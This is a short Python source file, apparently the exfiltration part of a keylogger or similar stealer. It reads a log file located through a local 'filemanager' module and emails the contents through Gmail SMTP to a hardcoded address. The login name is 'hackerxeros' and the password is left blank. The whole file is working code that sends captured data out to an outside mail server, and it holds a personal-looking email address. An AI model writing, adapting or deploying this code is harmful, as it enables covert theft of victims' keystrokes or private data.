import smtplib
import filemanager

def main():
    sender = "kmd2410@gmail.com"
    receiver = "kmd2410@gmail.com"
    username = "hackerxeros"
    password = ""

    log = open(filemanager.getlogfilepath(filemanager.getlogfilename()), mode='r', encoding='utf-8').read().encode()

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(username, password)
    server.sendmail(sender,receiver, log)
    server.quit()